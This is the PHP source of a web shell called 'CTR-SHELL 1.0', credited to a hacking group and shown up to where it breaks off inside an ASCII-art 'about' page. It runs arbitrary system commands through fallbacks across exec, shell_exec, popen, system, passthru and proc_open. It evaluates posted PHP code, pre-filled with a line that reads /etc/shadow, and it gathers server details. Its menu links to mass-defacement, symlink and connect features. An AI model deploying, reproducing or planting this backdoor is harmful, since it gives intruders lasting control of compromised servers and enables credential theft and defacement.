<?php
/*
########################################
#                                      #
#                                      #
#           CTR-SHELL 1.0              #
#                                      #               
#         Coded by Witch3r             #
#                                      #
#      http://Cyberteamrox.org         #
#                                      #
# Greetz:UxAir,ZeSn,Jr.Haxor,Baddass   #
#      Elsa,CodeNinja,Zen,Abk Khan,    #
#      Anas Ali,Kai Haxor              #
########################################
*/
                   
session_start();
$password = 'letmein'; //set your password
$pass = md5($pass); 
if(isset($_GET['logout']))
{unset($_SESSION['login']);}
$url = (!empty($_SERVER['HTTPS'])) ? "https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : "http://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
$phpVersion=phpversion();
$self=$_SERVER["PHP_SELF"]; 
$sm = @ini_get('safe_mode');
$SEPARATOR = '/'; 
$os = "N/D";
if(stristr(php_uname(),"Windows"))
{ $SEPARATOR = '\\';$os = "Windows";}
else if(stristr(php_uname(),"Linux"))
{ $os = "Linux";}
if (isset($_SESSION['login']) && $_SESSION['login'] == $pass) {?>
<html><head>
<style>
*{
    padding:0;
    margin:0;
}

.alert
{
    background:green;
    color:white;
    font-weight:bold;
}
td.info
{
    width:0px;
}

.bind 
{
    border: 1px solid #333333;
    margin: 15px auto 0;
    font-size: small;
}

div.end *
{
    font-size:small;
}

div.end 
{
    width:100%;
    background:#ccc;
}

p.blink
{
    text-decoration: blink;
}

body 
{
    background-color:black;
    color:rgb(35,182,39);
    font-family:Tahoma,Verdana,Arial;
    font-size: small;
}

input.own {
    background-color:black;
    color: green;
    border : 1px solid blue;
}
input.own:Hover
{
 background-color:white;
    color:red;
}
blockquote.small
{
    font-size: smaller;
    color: silver;
    text-align: center;
}

table.files
{
    border-spacing: 10px;
    font-size: small;
    background-color:black;
     
}
table.files a:hover
{
      color: #c00;
      background-color: #fff; 
      
}

h1 {
    padding: 4px;
    padding-bottom: 0px;
    margin-right : 5px;
}
div.logo
{
    border-right: 0px aqua solid;
}
div.header
{
    padding-left: 0px;
    font-size: small;
    text-align: left;
}
div.nav
{

    margin-top:1px;
    height:30px;
    background-color:black;
}

div.nav ul
{
  
    list-style: none;
    padding: 4px;
}


div.nav li
{
    float:left;
    margin-right: 10px;
    text-align:center;
}
div.log li a
{
      display: block;
      padding: 8px 15px;
      text-decoration: none;
      font-weight: bold;
      color: #069;
      border-left: 1px solid blue; 
      border-right: 1px solid green; 
}
div.log li a:hover
{
      color: #c00;
      background-color: #fff; 
}
div.nav li a
{
      display: block;
      padding: 8px 15px;
      text-decoration: none;
      font-weight: bold;
      color: #069;
      border-left: 1px solid blue; 
      border-right: 1px solid green; 
}
div.nav li a:hover
{
      color: #c00;
      background-color: #fff; 
}
div.title
{

    margin-top:1px;
    height:30px;
    background-color:black;
}

div.title ul
{
  
    list-style: none;
    padding: 0px;
}


div.title li
{
    float:left;
    margin-right: 0px;
    text-align:center;
}
div.title li a
{
      display: block;
      padding: 8px 15px;
      text-decoration: none;
      font-weight: bold;
      color: green;
    
}
div.title li a:hover
{
      color: #c00;
      background-color: #fff; 
}
div.log li a:hover
{
      color: #c00;
      background-color: #fff; 
}

textarea.cmd
{
    border : 1px solid #111;
    background-color : black;
    font-family: Shell;
    color : blue;
    margin-top: 10px;
    font-size:small;
}
input.button
{
 border-width: 0px;
background-color:black; 
color:green;
}
input.button:hover 
{
    background: white;
    color:red;

}
input.cmd
{
    background-color:black;
    color: white;
    width: 400px;
    border : 1px solid #ccc;

}
input.cmd:Hover
{
background: white;
    color:red;

}
td.maintext
{
    font-size: large;
}
#margins
{
    margin-left: 10px;
    margin-top: 10px;
    color:blue;
    font-size:14px;
}

table.top
{
    border-bottom: 1px solid aqua;
    width: 100%;
}
#borders
{
    border-top : 1px solid aqua;
    border-left:1px solid aqua;
    border-bottom: 1px solid aqua;
    border-right: 1px solid aqua;
    margin-bottom:0;
}
td.file a , .file a
{
    color : aqua;
    text-decoration:none;
}
a.dir
{
    color:white;
    font-weight:bold;
    text-decoration:none;
}
td.dir a
{
    color : white;
    text-decoration:none;
}
td.download,td.download2
{
    color:green;
}
#spacing
{
    padding:10px;
    margin-left:200px;
}
th.header
{
    background: none repeat scroll 0 0 green;
    color: white;
    border-bottom : 1px solid blue;
}
p.warning
{
    background : red;
    color: white;
}

</style>
</head>
<?php

    function showDrives()
    {
        global $self;
        foreach(range('A','Z') as $drive)
        {
            if(is_dir($drive.':\\'))
            {
                ?>
                <a class="dir" href='<?php echo $self ?>?dir=<?php echo $drive.":\\"; ?>'>
                    <?php echo $drive.":\\" ?>
                </a> 
                <?php
            }
        }
    }

    function HumanReadableFilesize($size)
    {
 
        $mod = 1024;
 
        $units = explode(' ','B KB MB GB TB PB');
        for ($i = 0; $size > $mod; $i++) 
        {
            $size /= $mod;
        }
 
        return round($size, 2) . ' ' . $units[$i];
    }

function getClientIp()
{echo $_SERVER['REMOTE_ADDR'];
}

function getServerIp()
{
    echo getenv('SERVER_ADDR');
}
function getSoftwareInfo()
{
    echo php_uname();
}
function diskSpace()
{
    echo HumanReadableFilesize(disk_total_space("/"));
}
function freeSpace()
{
    echo HumanReadableFilesize(disk_free_space("/"));
}
function getSafeMode()
{
        global $sm;
		echo($sm?"ON :( :'( (Most of the Features will Not Work!)":"OFF");
        
}

function execmd($cmd,$d_functions="None")
{
    if($d_functions=="None") 
    {
        $ret=passthru($cmd); 
        return $ret;
    }
    $funcs=array("shell_exec","exec","passthru","system","popen","proc_open");
    $d_functions=str_replace(" ","",$d_functions);
    $dis_funcs=explode(",",$d_functions);
    foreach($funcs as $safe)
    {
        if(!in_array($safe,$dis_funcs)) 
        {
            if($safe=="exec")
            {
                $ret=@exec($cmd);
                $ret=join("
",$ret);
                return $ret;
            }
            elseif($safe=="system")
            {
                $ret=@system($cmd);
                return $ret;
            }
            elseif($safe=="passthru")
            {
                $ret=@passthru($cmd);
                return $ret;
            }
            elseif($safe=="shell_exec")
            {
                $ret=@shell_exec($cmd);
                return $ret;
            }
            elseif($safe=="popen")
            {
                $ret=@popen("$cmd",'r');
                if(is_resource($ret))
                {
                    while(@!feof($ret))
                    $read.=@fgets($ret);
                    @pclose($ret);
                    return $read;
                }
                return -1;
            }
 
            elseif($safe="proc_open")
            {
                $cmdpipe=array(
                0=>array('pipe','r'),
                1=>array('pipe','w')
                );
                $resource=@proc_open($cmd,$cmdpipe,$pipes);
                if(@is_resource($resource))
                {
                    while(@!feof($pipes[1]))
                    $ret.=@fgets($pipes[1]);
                    @fclose($pipes[1]);
                    @proc_close($resource);
                    return $ret;
                }
                return -1;
            }
        }
    }
    return -1;
}

function getDisabledFunctions()
{
    if(!ini_get('disable_functions'))
    {
		echo "None";
    }
    else
    {
			echo @ini_get('disable_functions');
    }
}

function getFilePermissions($file)
{
    
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
} else {
    // Unknown
    $info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
            (($perms & 0x0800) ? 's' : 'x' ) :
            (($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
            (($perms & 0x0400) ? 's' : 'x' ) :
            (($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
            (($perms & 0x0200) ? 't' : 'x' ) :
            (($perms & 0x0200) ? 'T' : '-'));

return $info;

}

function exec_all($command)
{
    
    $output = '';
    if(function_exists('exec'))
    {   
        exec($command,$output);
        $output = join("\n",$output);
    }
    
    else if(function_exists('shell_exec'))
    {
        $output = shell_exec($command);
    }
    
    else if(function_exists('popen'))
    {
        $handle = popen($command , "r"); // Open the command pipe for reading
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fread($handle, 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($handle))
                {
                    $output .= fgets($handle,512);
                }
            }
        }
        pclose($handle);
    }
    
    
    else if(function_exists('system'))
    {
        ob_start(); //start output buffering
        system($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering
    }
    
    else if(function_exists('passthru'))
    {
        ob_start(); //start output buffering
        passthru($command);
        $output = ob_get_contents();    // Get the ouput 
        ob_end_clean();                 // Stop output buffering            
    }
    
    else if(function_exists('proc_open'))
    {
        $descriptorspec = array(
                1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
                );
        $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes'
        if(is_resource($handle))
        {
            if(function_exists('fread') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fread($pipes[1], 512);
                }
            }
            else if(function_exists('fgets') && function_exists('feof'))
            {
                while(!feof($pipes[1]))
                {
                    $output .= fgets($pipes[1],512);
                }
            }
        }
        pclose($handle);
    }
    else
    {
        $output = "They have their Security there! :( ";
    }
    
    return(htmlspecialchars($output));
    
}
function magicQuote($text)
{
    if (!get_magic_quotes_gpc())
    {
        return $text;
    }
    return stripslashes($text);
}

?>

<body bgcolor=black>
<table class="top">
    <tbody>
        <tr>
            <td width=200>
            <div class="logo"><center>
   <img src=http://ibin.co/1uRrmLl6HXlk width=100 height=100><br><div class="title"><li><a href="<?php echo $self;?>">CyberTeamRox Shell 1.0</a></div></a></center>
                
            </div>
            </td>
            <td >
            <div class="header"><font color=green size=3>
           <font color=red>Version: </font><?php getSoftwareInfo(); ?><br />
<font color=red>Your IP : </font><?php getClientIp(); ?> <font color="silver" >|</font> <font color=red>Server IP :</font> <?php getServerIp();?> <br />
            <font color=red>Safe Mode : </font><?php getSafeMode(); ?><br />
            <?php if($os == 'Windows'){ echo showDrives();} ?> <?php echo getcwd();?>
            </div>
            </td></font>
        </tr>
    </tbody>
</table>

<font color=white size=3 face=swift>  Server Admin: <?php echo $_SERVER['SERVER_ADMIN'];?> <font color="silver" >|</font>
            PHP VERSION : <?php echo $phpVersion; ?> <font color="silver" >|</font>
            Curl : <?php echo function_exists('curl_version')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            Oracle : <?php echo function_exists('ocilogon')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            MySQL : <?php  echo function_exists('mysql_connect')?("<font color='red'>Enabled</font>"):("Disabled");?> <font color="silver" >|</font>
            MSSQL : <?php echo function_exists('mssql_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>
            PostgreSQL : <?php echo function_exists('pg_connect')?("<font color='red'>Enabled</font>"):("Disabled"); ?> <font color="silver" >|</font>           
            Space : <?php diskSpace(); ?> <font color="silver" >|</font>
            Free : <?php freeSpace(); ?></font><hr>

</div>
<div class="nav">
<ul>
    <li><a href="<?php echo $self.'?shell';?>">Shell</a></li>
    <li><a href="<?php echo $self.'?connect'?>">Connect</a></li>
    <li><a href="<?php echo $self.'?symlinkserver'?>">Symlink</a></li>
    <li><a href="<?php echo $self.'?MassDeface'?>">Mass Defacer</a></li>
    <li><a href="<?php echo $self.'?reverse'?>">Reverse IP</a></li>
    <li><a href="<?php echo $self.'?about'?>">About us</a></li>
    <li> <a href="<?php echo $self.'?selfkill'?>" onClick="if(confirm('Shell Will be Killed')){return true;}else{return false;}">Kill Shell</a></li>
    <li><a href="<?php echo $self.'?logout'?>">Log Out</a></li>
</ul>
</div><br>
<hr></center>
<center>
<?php
if(isset($_GET['shell']))
{
    if(!isset($_GET['cmd']) || $_GET['cmd'] == '')
    {
        $result = "";    
    }
    else
    {
        $result=exec_all($_GET['cmd']);
    }
    ?>
    <textarea class="cmd" cols="100" rows="20" disabled=true><?php echo $result;?></textarea><br /><br />
    <form action="<?php echo $self;?>" method="GET">
    <!-- For Shell -->
    <input name="shell" type="hidden" />
    <!-- For CMD -->
    <input name="cmd" class="cmd" />
    <input name="submit" value="Command" class="own" type="submit" />
    </form>
    <?php
}
else if(isset($_GET['reverse']))
{
?>
<iframe 
src ="http://www.yougetsignal.com/tools/web-sites-on-web-server//"
height="600"
width="100%">
</iframe>

 <?php
}
else if(isset($_GET['eval']))
{
    ?>
    <form method="POST">
    <textarea name="code" class="cmd" cols="100" rows="20"><?php
    // If the comand was sent
    if(isset($_POST['code'])
        && $_POST['code']
    )
    {
        // FIlter Some Chars we dont need

        $code = str_replace("<?php","",$_POST['code']);
        $code = str_replace("<?","",$code);
        $code = str_replace("?>","",$code);

        // Evaluate PHP CoDE!

        htmlspecialchars(eval($code));
    }
    else
    {
        ?>echo file_get_contents('/etc/shadow');<?php
    }
    ?></textarea><br /><br />
    <input name="submit" value="Evaluate" class="own" type="submit" />
    </form>
    <?php
    
}
else if(isset($_GET['about']))
{
    ?>
    <font size=4>
<font size="-3">
<!-- IMAGE BEGINS HERE -->
<font size="-3">
<pre><font color=#000101>001001010011000111101100010010</font><font color=#000102>1</font><font color=#000101>0</font><font color=#000002>0</font><font color=#010102>0</font><font color=#010204>1</font><font color=#020507>1</font><font color=#04090b>1</font><font color=#071013>0</font><font color=#091619>0</font><font color=#0c1c21>0</font><font color=#0d2026>0</font><font color=#0f232a>1</font><font color=#112831>0</font><font color=#10282f>1</font><font color=#0f252b>0</font><font color=#0f242b>0</font><font color=#0e2026>0</font><font color=#0c1e24>1</font><font color=#0c1d23>0</font><font color=#0c1e23>0</font><font color=#0d1e24>1</font><font color=#0c1d23>1</font><font color=#0d1e24>0</font><font color=#0d1f25>0</font><font color=#0d2128>0</font><font color=#0d2127>0</font><font color=#0e2229>1</font><font color=#0f242b>0</font><font color=#0e2129>0</font><font color=#0c1e24>1</font><font color=#0a1a1f>0</font><font color=#081418>0</font><font color=#060f12>1</font><font color=#040a0d>0</font><font color=#030609>0</font><font color=#020405>1</font><font color=#010202>0</font><font color=#000102>1</font><font color=#000101>00011000110010001101000011011110</font><br><font color=black>0101110001100100001111011100</font><font color=#000101>1</font><font color=#020506>0</font><font color=#060e11>1</font><font color=#09161a>0</font><font color=#0b1c21>0</font><font color=#0d2025>0</font><font color=#0d2127>1</font><font color=#0d1f23>1</font><font color=#0b1b1f>1</font><font color=#09181b>1</font><font color=#071215>0</font><font color=#060c0e>1</font><font color=#04080a>1</font><font color=#020506>0</font><font color=#020303>1</font><font color=#010101>0</font><font color=#000101>0</font><font color=#010001>0</font><font color=black>01000111</font><font color=#000001>0</font><font color=#010101>01</font><font color=#010202>1</font><font color=#010304>0</font><font color=#030607>0</font><font color=#040a0b>1</font><font color=#060e11>1</font><font color=#081417>0</font><font color=#0a171c>1</font><font color=#0a1a20>0</font><font color=#0d1e23>1</font><font color=#0d1f23>0</font><font color=#0c1c21>0</font><font color=#09161a>1</font><font color=#071013>1</font><font color=#04090b>0</font><font color=#010203>1</font><font color=#000001>11</font><font color=black>10110011000111110001111011</font><br><font color=black>001001111110010011001111</font><font color=#000101>1</font><font color=#060c0d>0</font><font color=#0b1b20>0</font><font color=#0f262c>1</font><font color=#10282f>0</font><font color=#0e2127>1</font><font color=#0a181c>0</font><font color=#060e11>1</font><font color=#04090b>0</font><font color=#020405>0</font><font color=#000102>1</font><font color=black>00001</font><font color=#010101>10</font><font color=black>10010110110001100001000</font><font color=#010101>0</font><font color=#010203>0</font><font color=#020607>0</font><font color=#040a0c>0</font><font color=#071215>0</font><font color=#0c1c21>0</font><font color=#0f242a>0</font><font color=#0f2329>1</font><font color=#0b1b20>0</font><font color=#050b0d>0</font><font color=#000101>0</font><font color=black>011011110101010101100111</font><br><font color=black>01011011111000001111</font><font color=#010101>1</font><font color=#030709>0</font><font color=#091519>1</font><font color=#0f252b>1</font><font color=#132e35>1</font><font color=#10262d>0</font><font color=#081115>1</font><font color=#020505>0</font><font color=#010100>1</font><font color=#000001>0</font><font color=black>10110011001100000111011000110100001001000</font><font color=#000001>0</font><font color=#010202>0</font><font color=#04090b>1</font><font color=#0a191d>0</font><font color=#0e2227>1</font><font color=#0d1f25>1</font><font color=#081417>0</font><font color=#04080a>0</font><font color=#010202>0</font><font color=#010101>1</font><font color=black>1001100001000110010</font><br><font color=black>01000011101101</font><font color=#010000>0</font><font color=#000001>1</font><font color=black>0</font><font color=#010101>0</font><font color=#040a0c>1</font><font color=#0c1d21>0</font><font color=#112a31>0</font><font color=#10262e>1</font><font color=#0a1a1e>1</font><font color=#04090b>1</font><font color=#000101>0</font><font color=black>1</font><font color=#010000>1</font><font color=black>0110110110101110</font><font color=#000001>1</font><font color=black>00000</font><font color=#010000>1</font><font color=black>11111000111000110001001011</font><font color=#010303>0</font><font color=#060e11>0</font><font color=#0b1b20>0</font><font color=#0d2025>0</font><font color=#0b1a1e>1</font><font color=#040b0d>1</font><font color=#010102>0</font><font color=black>10001111010101101</font><br><font color=black>110111000000001</font><font color=#010203>0</font><font color=#0b191e>0</font><font color=#14323b>0</font><font color=#122b33>0</font><font color=#09161a>0</font><font color=#030608>1</font><font color=#000102>0</font><font color=#000101>0</font><font color=#000001>1</font><font color=black>000</font><font color=#020000>00</font><font color=#010000>0</font><font color=#000001>10</font><font color=#000102>0</font><font color=#000001>10</font><font color=#000102>1</font><font color=#020302>0</font><font color=#030302>0</font><font color=#030101>010</font><font color=#080201>0</font><font color=#0d0602>1</font><font color=#100904>1</font><font color=#130c05>1</font><font color=#150f09>10</font><font color=#130d08>1</font><font color=#110b06>0</font><font color=#0e0803>1</font><font color=#090401>0</font><font color=#050200>1</font><font color=#020000>000</font><font color=#010000>110</font><font color=#000001>0</font><font color=#000002>1</font><font color=#000003>0</font><font color=#000004>0</font><font color=#010003>1</font><font color=#010001>0</font><font color=#010000>0</font><font color=#010100>11</font><font color=black>10</font><font color=#010000>00</font><font color=black>0001100</font><font color=#000001>0</font><font color=#010203>1</font><font color=#050b0e>1</font><font color=#0c1b20>1</font><font color=#10262d>0</font><font color=#0a171c>1</font><font color=#010304>1</font><font color=black>000100100001000</font><br><font color=black>101001000101</font><font color=#000101>1</font><font color=#040a0c>0</font><font color=#10272d>1</font><font color=#17363f>0</font><font color=#0e1e25>1</font><font color=#040609>1</font><font color=#010102>0</font><font color=black>10111011</font><font color=#050004>1</font><font color=#060004>1</font><font color=#030003>0</font><font color=#010103>0</font><font color=#010202>1</font><font color=#020302>0</font><font color=#040303>0</font><font color=#040204>0</font><font color=#0d0a09>0</font><font color=#312018>1</font><font color=#564035>1</font><font color=#7d6757>0</font><font color=#a28c76>1</font><font color=#bca58b>1</font><font color=#ceb897>1</font><font color=#d9c5a0>0</font><font color=#dfcaa2>1</font><font color=#e1cca2>0</font><font color=#dec7a4>1</font><font color=#ddc6a2>1</font><font color=#d9c19c>1</font><font color=#d5bd98>0</font><font color=#ceb692>0</font><font color=#c6af8a>1</font><font color=#bca17d>0</font><font color=#af926d>1</font><font color=#9d7f5c>0</font><font color=#81684d>0</font><font color=#684f37>0</font><font color=#4b3425>1</font><font color=#331f14>1</font><font color=#1f100a>1</font><font color=#130808>0</font><font color=#0d0308>1</font><font color=#0c0109>0</font><font color=#080009>0</font><font color=#020007>1</font><font color=#020103>0</font><font color=#020101>1</font><font color=#030301>0</font><font color=#010100>11</font><font color=#010001>0</font><font color=#010003>1</font><font color=#000002>1</font><font color=black>110111</font><font color=#010000>11</font><font color=black>1</font><font color=#000001>1</font><font color=#010102>0</font><font color=#070e11>0</font><font color=#10252c>1</font><font color=#0e2127>1</font><font color=#050a0c>1</font><font color=#010102>1</font><font color=black>000011101011</font><br><font color=black>11001010101</font><font color=#050b0e>0</font><font color=#122c34>1</font><font color=#16343e>1</font><font color=#0a161a>0</font><font color=#040204>1</font><font color=#040102>0</font><font color=#040001>0</font><font color=#020001>0</font><font color=black>10100111</font><font color=#010107>1</font><font color=#010109>1</font><font color=#010104>0</font><font color=#030101>0</font><font color=#070201>0</font><font color=#1c1009>0</font><font color=#52402c>1</font><font color=#8c7155>0</font><font color=#b39778>1</font><font color=#bda78f>0</font><font color=#b29d86>1</font><font color=#9c8673>0</font><font color=#826d5c>1</font><font color=#6b5949>1</font><font color=#584638>0</font><font color=#46382b>1</font><font color=#3a2e22>1</font><font color=#32261c>1</font><font color=#2b1d16>0</font><font color=#291a14>1</font><font color=#251812>0</font><font color=#241712>0</font><font color=#251711>0</font><font color=#281912>1</font><font color=#2d1e15>1</font><font color=#322319>1</font><font color=#3e2c1f>1</font><font color=#523422>1</font><font color=#5e3f2d>1</font><font color=#694732>1</font><font color=#6f4e35>0</font><font color=#6a4b31>1</font><font color=#66482d>1</font><font color=#5b4027>0</font><font color=#4b301e>1</font><font color=#332018>0</font><font color=#110f11>1</font><font color=#050305>0</font><font color=#020101>0</font><font color=#020100>1</font><font color=#020101>0</font><font color=#010100>1</font><font color=#020001>1</font><font color=#030002>0</font><font color=#010102>0</font><font color=#010103>1</font><font color=#010102>0</font><font color=#000101>1</font><font color=#010102>1</font><font color=#010103>0</font><font color=#010101>0</font><font color=#010102>1</font><font color=#020103>0</font><font color=#000001>1</font><font color=black>0001</font><font color=#04080a>1</font><font color=#0d2126>1</font><font color=#0f242a>1</font><font color=#050c0e>1</font><font color=black>1</font><font color=#000001>1</font><font color=black>000010000</font><br><font color=black>010110110</font><font color=#020607>1</font><font color=#122a30>1</font><font color=#18353f>0</font><font color=#0b171c>0</font><font color=#040406>0</font><font color=#010103>1</font><font color=#010104>0</font><font color=#010105>10</font><font color=#000003>1</font><font color=black>11011001</font><font color=#020102>1</font><font color=#040202>1</font><font color=#060301>1</font><font color=#281e16>1</font><font color=#63523c>0</font><font color=#6f553b>1</font><font color=#654932>0</font><font color=#4e3021>0</font><font color=#391810>0</font><font color=#160b07>0</font><font color=#0c0503>0</font><font color=#0a0202>1</font><font color=#060101>1</font><font color=#030000>1</font><font color=#010002>0</font><font color=#010003>0</font><font color=#010106>1</font><font color=#040208>0</font><font color=#210e03>1</font><font color=#301d10>0</font><font color=#3f2b1a>1</font><font color=#4e341d>1</font><font color=#563920>0</font><font color=#5c3d21>1</font><font color=#634224>1</font><font color=#664427>1</font><font color=#5e3f2a>1</font><font color=#463630>0</font><font color=#372721>0</font><font color=#21140e>0</font><font color=#140704>1</font><font color=#0c0201>0</font><font color=#0f0401>0</font><font color=#130905>1</font><font color=#18100b>1</font><font color=#1b130f>0</font><font color=#1f1311>0</font><font color=#150a07>1</font><font color=#150905>0</font><font color=#201511>0</font><font color=#2b1f1b>1</font><font color=#2f251f>1</font><font color=#2f2720>1</font><font color=#281e19>0</font><font color=#1c130d>0</font><font color=#110704>0</font><font color=#090302>0</font><font color=#060001>1</font><font color=#050101>0</font><font color=#030102>1</font><font color=#010104>1</font><font color=#010205>1</font><font color=#010307>0</font><font color=#000103>1</font><font color=black>1101</font><font color=#000100>0</font><font color=#010101>0</font><font color=#04090b>0</font><font color=#0e2026>0</font><font color=#10252b>0</font><font color=#030709>0</font><font color=black>000011011</font><br><font color=black>0101010</font><font color=#010203>1</font><font color=#0c1c21>0</font><font color=#1b3c45>0</font><font color=#3c3d36>0</font><font color=#483427>0</font><font color=#39261b>0</font><font color=#2f1c12>0</font><font color=#1e1009>0</font><font color=#140a05>0</font><font color=#0c0504>1</font><font color=#080305>1</font><font color=#040203>1</font><font color=#020101>1</font><font color=#010000>1</font><font color=#020000>00</font><font color=#010100>1</font><font color=#020101>0</font><font color=#010100>0</font><font color=#010000>1</font><font color=#060101>0</font><font color=#0b0402>1</font><font color=#221a15>1</font><font color=#221c16>1</font><font color=#0c0807>0</font><font color=#080202>1</font><font color=#080205>1</font><font color=#06020b>0</font><font color=#040212>0</font><font color=#070606>00</font><font color=#080506>00</font><font color=#0a0605>0</font><font color=#0b0503>0</font><font color=#0d0404>0</font><font color=#110504>1</font><font color=#120605>1</font><font color=#1a0a0b>0</font><font color=#1b0b0b>1</font><font color=#1b0c0c>0</font><font color=#1e0e0b>0</font><font color=#211009>1</font><font color=#26130b>0</font><font color=#2e180f>0</font><font color=#3a2213>0</font><font color=#4f321f>1</font><font color=#714732>0</font><font color=#8a6042>0</font><font color=#a27652>0</font><font color=#ad875f>1</font><font color=#a3815f>1</font><font color=#836146>0</font><font color=#563925>1</font><font color=#4a2c1e>1</font><font color=#492f22>1</font><font color=#302116>0</font><font color=#190905>0</font><font color=#0e0100>0</font><font color=#0b0101>1</font><font color=#090202>1</font><font color=#0c0506>0</font><font color=#140d0d>0</font><font color=#221d18>1</font><font color=#442d21>1</font><font color=#693f26>0</font><font color=#764e35>1</font><font color=#765239>0</font><font color=#624835>0</font><font color=#443227>0</font><font color=#271a12>0</font><font color=#130906>1</font><font color=#0b0302>1</font><font color=#040001>0</font><font color=#010000>00</font><font color=#000002>1</font><font color=#000103>0</font><font color=#000002>0</font><font color=#000001>1</font><font color=#010001>0</font><font color=#020102>0</font><font color=#050a0d>1</font><font color=#10262e>0</font><font color=#0a181d>0</font><font color=#010202>0</font><font color=black>1</font><font color=#000001>0</font><font color=black>11111</font><br><font color=black>01110</font><font color=#000001>1</font><font color=#030809>1</font><font color=#143139>1</font><font color=#15323a>0</font><font color=#050a0b>1</font><font color=#080302>0</font><font color=#24140e>0</font><font color=#53311f>0</font><font color=#875a39>1</font><font color=#ac8156>1</font><font color=#b9956e>1</font><font color=#b69b80>0</font><font color=#ad977f>0</font><font color=#968873>1</font><font color=#867a67>1</font><font color=#7e705f>0</font><font color=#726252>1</font><font color=#695a4a>1</font><font color=#645546>1</font><font color=#5f5042>0</font><font color=#5d4e41>0</font><font color=#594c42>0</font><font color=#654d3e>1</font><font color=#694f3c>0</font><font color=#644b37>1</font><font color=#58402d>1</font><font color=#4a3829>1</font><font color=#392d23>0</font><font color=#271d19>0</font><font color=#120b07>1</font><font color=#0d0a07>1</font><font color=#2d1a11>1</font><font color=#3b241a>1</font><font color=#452d22>1</font><font color=#513625>1</font><font color=#5c3b28>1</font><font color=#644028>0</font><font color=#734a2e>1</font><font color=#825638>1</font><font color=#8b5e3e>0</font><font color=#966b4a>0</font><font color=#9d7251>1</font><font color=#a37c5a>0</font><font color=#a88463>1</font><font color=#ad8b6b>0</font><font color=#af9071>1</font><font color=#b09474>1</font><font color=#b09475>1</font><font color=#b09374>1</font><font color=#aa9075>0</font><font color=#a28f79>0</font><font color=#998772>1</font><font color=#957e69>1</font><font color=#a68164>0</font><font color=#c4986e>1</font><font color=#d2ac82>1</font><font color=#d2ae89>0</font><font color=#b0856b>0</font><font color=#995630>1</font><font color=#8d5026>0</font><font color=#744928>1</font><font color=#3e2315>0</font><font color=#100604>1</font><font color=#040207>1</font><font color=#040208>1</font><font color=#030108>0</font><font color=#030205>0</font><font color=#020101>1</font><font color=#050201>0</font><font color=#110806>0</font><font color=#2c1d17>1</font><font color=#553e2f>0</font><font color=#7f5e44>0</font><font color=#986f4e>1</font><font color=#916547>0</font><font color=#5c3f2e>0</font><font color=#27170f>0</font><font color=#0f0503>1</font><font color=#060105>0</font><font color=#030108>0</font><font color=#010009>0</font><font color=#010005>0</font><font color=#020101>0</font><font color=#050100>1</font><font color=#010101>1</font><font color=#010202>0</font><font color=#0a181c>1</font><font color=#0f242a>0</font><font color=#030709>0</font><font color=black>011110</font><br><font color=black>0111</font><font color=#000001>1</font><font color=#060d10>1</font><font color=#1a3e48>0</font><font color=#0e2329>0</font><font color=#010304>1</font><font color=#010102>1</font><font color=#010105>1</font><font color=#020206>1</font><font color=#040305>0</font><font color=#060305>1</font><font color=#0d0705>0</font><font color=#1e150f>0</font><font color=#3a2e25>0</font><font color=#56493d>0</font><font color=#736150>0</font><font color=#957d65>1</font><font color=#b79b7a>1</font><font color=#d4b998>0</font><font color=#e4c9a6>0</font><font color=#e4caa9>0</font><font color=#e6c9aa>1</font><font color=#cfaf8d>1</font><font color=#b18b6a>0</font><font color=#8b6f55>1</font><font color=#65503c>1</font><font color=#463124>0</font><font color=#2c1a12>0</font><font color=#180c0a>1</font><font color=#0b0504>1</font><font color=#040202>1</font><font color=#050203>1</font><font color=#030203>0</font><font color=#020205>10</font><font color=#030204>0</font><font color=#040203>0</font><font color=#060202>1</font><font color=#080302>0</font><font color=#0a0502>1</font><font color=#0c0603>1</font><font color=#0d0704>1</font><font color=#110b08>0</font><font color=#150d09>0</font><font color=#1b120d>0</font><font color=#221812>0</font><font color=#291d16>0</font><font color=#35251c>1</font><font color=#413024>1</font><font color=#4d3b2e>1</font><font color=#5f4b39>0</font><font color=#775f49>1</font><font color=#8d7560>1</font><font color=#aa9781>1</font><font color=#d4c8b3>1</font><font color=#fcf6e6>0</font><font color=#fdf8ec>0</font><font color=#f9f6ed>1</font><font color=#f7f3ec>1</font><font color=#fbf9f1>1</font><font color=#f2e8d4>0</font><font color=#bfa283>0</font><font color=#8a5c34>1</font><font color=#a4703e>0</font><font color=#ad8457>1</font><font color=#583d27>0</font><font color=#140804>0</font><font color=#050101>0</font><font color=#020203>0</font><font color=#010204>0</font><font color=#010203>1</font><font color=#040203>1</font><font color=#050201>0</font><font color=#060101>0</font><font color=#0a0201>1</font><font color=#150a06>0</font><font color=#31241c>1</font><font color=#6d513b>1</font><font 